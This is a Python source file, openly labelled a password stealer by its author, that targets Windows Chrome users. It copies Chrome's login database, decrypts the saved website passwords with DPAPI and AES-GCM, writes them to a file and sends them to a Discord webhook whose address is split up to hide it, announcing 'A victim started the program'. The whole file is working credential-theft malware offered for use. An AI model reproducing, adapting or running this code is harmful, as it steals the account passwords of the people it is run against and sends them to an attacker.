import sys, os, shutil, sqlite3, base64, json

from cryptography.hazmat.primitives.ciphers import modes, Cipher, algorithms
from cryptography.hazmat.backends import default_backend
from dhooks import File, Webhook

if sys.platform.startswith('linux'):
    exit()
else:
    pass

APP_DATA_PATH = os.environ['APPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12

webhID = "" #Here, *ID* of your Webhook
webhAT = "" #Here, *Token* of your Webhook
http = "https"
disc = "discord"
webh = "webhooks"
appl = "api"
server = f"{http}://{disc}.com/{appl}/{webh}/{webhID}/{webhAT}"
hook = Webhook(f"{server}")


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)

def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)

def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher

def dpapi(encrypted):
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blobin), None, None, None, None, 0,
                                                      ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8',
              mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]

def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)

class chromepassword:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)

    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = 'WEBSITE: %s\nID: %s\nPASSWORD: %s\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[: 16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as z:
            z.writelines(self.passwordList)

class ogxpassword:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)

    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = 'SITE: %s\nIDENTIFIANT: %s\nPASSWORD: %s\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[: 16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as z:
            z.writelines(self.passwordList)

if __name__ == "__main__":
    main = chromepassword()
    try:
        main.chromedb()
    except:
        pass
    main.saved()




passwords = File(r'C:\ProgramData\passwords.zip')
hook.send("A victim started the program !")
hook.send("Here is the list of all his passwords on chrome:", file=passwords)
hook.send("|")
hook.send("|")
hook.send("Passwords stealer made by Baiiki.")
hook.send("|")
os.remove(r'C:\ProgramData\passwords.txt')
